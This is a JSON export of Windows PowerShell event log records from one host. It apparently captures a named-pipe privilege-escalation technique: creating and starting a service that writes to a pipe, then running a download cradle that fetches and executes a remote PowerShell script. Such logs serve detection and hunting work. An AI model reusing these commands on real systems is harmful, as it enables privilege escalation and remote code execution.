{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-24 13:08:50.6452802"},"EventRecordID":"1052","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Registry, Started, \tProviderName=Registry\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=1\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=ba45bde8-0a73-476d-a02b-c4c6672eee53\r\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -c New-Service -Name svcHighPriv -BinaryPathName 'C:\\windows\\system32\\cmd.exe /C echo Uuup! &gt; \\\\.\\pipe\\HighPriv' -StartupType Manual\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-24 13:08:50.6678515"},"EventRecordID":"1053","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Alias, Started, \tProviderName=Alias\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=3\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=ba45bde8-0a73-476d-a02b-c4c6672eee53\r\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -c New-Service -Name svcHighPriv -BinaryPathName 'C:\\windows\\system32\\cmd.exe /C echo Uuup! &gt; \\\\.\\pipe\\HighPriv' -StartupType Manual\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-24 13:08:50.6711588"},"EventRecordID":"1054","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Environment, Started, \tProviderName=Environment\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=5\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=ba45bde8-0a73-476d-a02b-c4c6672eee53\r\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -c New-Service -Name svcHighPriv -BinaryPathName 'C:\\windows\\system32\\cmd.exe /C echo Uuup! &gt; \\\\.\\pipe\\HighPriv' -StartupType Manual\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-24 13:08:50.6879540"},"EventRecordID":"1055","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"FileSystem, Started, \tProviderName=FileSystem\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=7\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=ba45bde8-0a73-476d-a02b-c4c6672eee53\r\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -c New-Service -Name svcHighPriv -BinaryPathName 'C:\\windows\\system32\\cmd.exe /C echo Uuup! &gt; \\\\.\\pipe\\HighPriv' -StartupType Manual\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-24 13:08:50.6879540"},"EventRecordID":"1056","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Function, Started, \tProviderName=Function\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=9\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=ba45bde8-0a73-476d-a02b-c4c6672eee53\r\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -c New-Service -Name svcHighPriv -BinaryPathName 'C:\\windows\\system32\\cmd.exe /C echo Uuup! &gt; \\\\.\\pipe\\HighPriv' -StartupType Manual\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-24 13:08:50.6948611"},"EventRecordID":"1057","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Variable, Started, \tProviderName=Variable\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=11\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=ba45bde8-0a73-476d-a02b-c4c6672eee53\r\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -c New-Service -Name svcHighPriv -BinaryPathName 'C:\\windows\\system32\\cmd.exe /C echo Uuup! &gt; \\\\.\\pipe\\HighPriv' -StartupType Manual\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"400"},"Version":"0","Level":"4","Task":"4","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-24 13:08:50.9305314"},"EventRecordID":"1058","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Available, None, \tNewEngineState=Available\r\n\tPreviousEngineState=None\r\n\r\n\tSequenceNumber=13\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=ba45bde8-0a73-476d-a02b-c4c6672eee53\r\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -c New-Service -Name svcHighPriv -BinaryPathName 'C:\\windows\\system32\\cmd.exe /C echo Uuup! &gt; \\\\.\\pipe\\HighPriv' -StartupType Manual\r\n\tEngineVersion=5.1.19041.5007\r\n\tRunspaceId=61a11dda-dafa-42e2-a934-df53595d0679\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"403"},"Version":"0","Level":"4","Task":"4","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-24 13:08:53.0078533"},"EventRecordID":"1059","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Stopped, Available, \tNewEngineState=Stopped\r\n\tPreviousEngineState=Available\r\n\r\n\tSequenceNumber=15\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=ba45bde8-0a73-476d-a02b-c4c6672eee53\r\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -c New-Service -Name svcHighPriv -BinaryPathName 'C:\\windows\\system32\\cmd.exe /C echo Uuup! &gt; \\\\.\\pipe\\HighPriv' -StartupType Manual\r\n\tEngineVersion=5.1.19041.5007\r\n\tRunspaceId=61a11dda-dafa-42e2-a934-df53595d0679\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-24 13:08:53.4465577"},"EventRecordID":"1060","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Registry, Started, \tProviderName=Registry\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=1\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=ef1be221-d2b8-4fe9-a169-0d15d6191ead\r\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -c Start-Service -Name svcHighPriv\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-24 13:08:53.4465577"},"EventRecordID":"1061","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Alias, Started, \tProviderName=Alias\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=3\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=ef1be221-d2b8-4fe9-a169-0d15d6191ead\r\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -c Start-Service -Name svcHighPriv\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-24 13:08:53.4465577"},"EventRecordID":"1062","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Environment, Started, \tProviderName=Environment\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=5\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=ef1be221-d2b8-4fe9-a169-0d15d6191ead\r\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -c Start-Service -Name svcHighPriv\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-24 13:08:53.4682484"},"EventRecordID":"1063","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"FileSystem, Started, \tProviderName=FileSystem\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=7\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=ef1be221-d2b8-4fe9-a169-0d15d6191ead\r\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -c Start-Service -Name svcHighPriv\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-24 13:08:53.4718993"},"EventRecordID":"1064","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Function, Started, \tProviderName=Function\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=9\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=ef1be221-d2b8-4fe9-a169-0d15d6191ead\r\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -c Start-Service -Name svcHighPriv\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-24 13:08:53.4783044"},"EventRecordID":"1065","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Variable, Started, \tProviderName=Variable\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=11\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=ef1be221-d2b8-4fe9-a169-0d15d6191ead\r\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -c Start-Service -Name svcHighPriv\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"400"},"Version":"0","Level":"4","Task":"4","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-24 13:08:53.6419331"},"EventRecordID":"1066","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Available, None, \tNewEngineState=Available\r\n\tPreviousEngineState=None\r\n\r\n\tSequenceNumber=13\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=ef1be221-d2b8-4fe9-a169-0d15d6191ead\r\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -c Start-Service -Name svcHighPriv\r\n\tEngineVersion=5.1.19041.5007\r\n\tRunspaceId=5ea4b0c7-b56a-4eca-9a65-65b7e4cb70e0\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"403"},"Version":"0","Level":"4","Task":"4","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-24 13:08:54.8812497"},"EventRecordID":"1067","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Stopped, Available, \tNewEngineState=Stopped\r\n\tPreviousEngineState=Available\r\n\r\n\tSequenceNumber=15\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=ef1be221-d2b8-4fe9-a169-0d15d6191ead\r\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -c Start-Service -Name svcHighPriv\r\n\tEngineVersion=5.1.19041.5007\r\n\tRunspaceId=5ea4b0c7-b56a-4eca-9a65-65b7e4cb70e0\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-24 13:08:55.1594092"},"EventRecordID":"1068","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Registry, Started, \tProviderName=Registry\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=1\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=dcfd6c3a-08d5-4fa5-a403-e532dd45206d\r\n\tHostApplication=powershell.exe\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-24 13:08:55.1663512"},"EventRecordID":"1069","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Alias, Started, \tProviderName=Alias\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=3\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=dcfd6c3a-08d5-4fa5-a403-e532dd45206d\r\n\tHostApplication=powershell.exe\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-24 13:08:55.1735376"},"EventRecordID":"1070","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Environment, Started, \tProviderName=Environment\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=5\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=dcfd6c3a-08d5-4fa5-a403-e532dd45206d\r\n\tHostApplication=powershell.exe\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-24 13:08:55.1807255"},"EventRecordID":"1071","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"FileSystem, Started, \tProviderName=FileSystem\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=7\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=dcfd6c3a-08d5-4fa5-a403-e532dd45206d\r\n\tHostApplication=powershell.exe\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-24 13:08:55.1845618"},"EventRecordID":"1072","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Function, Started, \tProviderName=Function\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=9\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=dcfd6c3a-08d5-4fa5-a403-e532dd45206d\r\n\tHostApplication=powershell.exe\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-24 13:08:55.1858699"},"EventRecordID":"1073","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Variable, Started, \tProviderName=Variable\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=11\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=dcfd6c3a-08d5-4fa5-a403-e532dd45206d\r\n\tHostApplication=powershell.exe\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"400"},"Version":"0","Level":"4","Task":"4","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-24 13:08:55.4123913"},"EventRecordID":"1074","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Available, None, \tNewEngineState=Available\r\n\tPreviousEngineState=None\r\n\r\n\tSequenceNumber=13\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=dcfd6c3a-08d5-4fa5-a403-e532dd45206d\r\n\tHostApplication=powershell.exe\r\n\tEngineVersion=5.1.19041.5007\r\n\tRunspaceId=a3c72efe-99c6-4a45-a0fc-2d35c1d92702\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"403"},"Version":"0","Level":"4","Task":"4","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-24 13:08:56.3546682"},"EventRecordID":"1075","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Stopped, Available, \tNewEngineState=Stopped\r\n\tPreviousEngineState=Available\r\n\r\n\tSequenceNumber=17\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=544c78b6-b2dc-46a7-b3e2-d5c9aa83f5f4\r\n\tHostApplication=powershell.exe &amp; {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/NamedPipe/NamedPipeSystem.ps1')}\r\n\tEngineVersion=5.1.19041.5007\r\n\tRunspaceId=fc2ae53a-e9d2-42b5-9794-db094d53aee6\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
